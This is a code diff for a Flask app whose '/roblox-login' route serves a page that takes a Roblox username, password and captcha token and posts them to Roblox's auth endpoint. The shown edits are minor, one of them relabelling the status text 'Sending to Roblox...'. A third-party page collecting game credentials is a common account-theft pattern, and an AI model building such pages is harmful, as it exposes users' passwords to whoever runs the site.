@@ -1,3 +1,4 @@
+
 from flask import Flask, render_template_string
 import os
 
@@ -14,7 +15,7 @@ def home():
 def ping():
     return "OK"
 
-@app.route('/roblox-login', methods=['GET'])
+@app.route('/roblox-login')
 def roblox_login_page():
     html = f"""
     <!DOCTYPE html>
@@ -64,7 +65,7 @@ def roblox_login_page():
                 if (!user || !pass) return resEl.textContent = "Enter username and password";
                 if (!token) return resEl.textContent = "Solve captcha first!";
 
-                resEl.textContent = "Sending...\n";
+                resEl.textContent = "Sending to Roblox...\n";
 
                 try {{
                     const resp = await fetch('https://auth.roblox.com/v2/login', {{
